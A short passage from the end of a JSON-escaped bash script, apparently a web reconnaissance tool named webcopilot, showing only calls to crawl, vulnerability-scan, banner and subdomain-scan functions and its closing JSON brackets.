/dev/null\n    crawl 2> /dev/null\n    vulnScan 2> /dev/null\n    result\n}\n\nwhile true\ndo \n    banner\n    info \n    if [ -n \"$allScanning\" ]; then webcopilot; else subScan; fi\n    exit 1\ndone"
        }
      ]
    }
  ]
}